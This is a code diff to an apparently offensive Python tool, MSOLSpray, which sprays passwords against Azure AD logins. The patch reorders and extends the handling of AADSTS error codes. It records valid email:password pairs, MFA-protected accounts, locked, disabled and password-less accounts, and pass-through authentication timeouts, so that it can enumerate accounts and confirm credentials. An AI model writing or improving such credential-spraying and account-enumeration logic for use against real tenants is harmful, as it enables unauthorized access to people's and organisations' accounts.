@@ -115,22 +115,6 @@ class MSOLSpray:
                     self.valid_logins.append(f'{email} : {self.password}')
                     self.valid_emails.append(email)
 
-                elif 'AADSTS50158' in error:
-                    # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
-                    log.critical(f'{email} : {self.password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.')
-                    self.valid_logins.append(f'{email} : {self.password}')
-                    self.valid_emails.append(email)
-
-                elif 'AADSTS50053' in error:
-                    # Locked out account or Smart Lockout in place
-                    log.error(f'The account {email} appears to be locked.')
-                    self.valid_emails.append(email)
-                    self.lockout_counter += 1
-
-                elif 'AADSTS50057' in error:
-                    # Disabled account
-                    log.info(f'The account {email} appears to be disabled.')
-
                 elif 'AADSTS50055' in error:
                     # User password is expired
                     log.critical(f'{email} : {self.password} - NOTE: The user\'s password is expired.')
@@ -143,6 +127,30 @@ class MSOLSpray:
                     log.error(error)
                     self.valid_logins.append(f'{email} : {self.password}')
                     self.valid_emails.append(email)
+
+                elif 'AADSTS50158' in error:
+                    # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
+                    log.critical(f'{email} : {self.password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.')
+                    self.valid_logins.append(f'{email} : {self.password}')
+                    self.valid_emails.append(email)
+
+                elif 'AADSTS50053' in error:
+                    # Locked out account or Smart Lockout in place
+                    log.error(f'The account {email} appears to be locked.')
+                    self.valid_emails.append(email)
+                    self.lockout_counter += 1
+
+                elif 'AADSTS50056' in error:
+                    log.error(f'The account {email} exists but does not have a password in Azure AD.')
+                    self.valid_emails.append(email)
+
+                elif 'AADSTS80014' in error:
+                    log.error(f'Account {email} exists, but the maximum Pass-through Authentication time was exceeded.')
+                    self.valid_emails.append(email)
+
+                elif 'AADSTS50057' in error:
+                    # Disabled account
+                    log.info(f'The account {email} appears to be disabled.')
 
                 else:
                     # Unknown errors
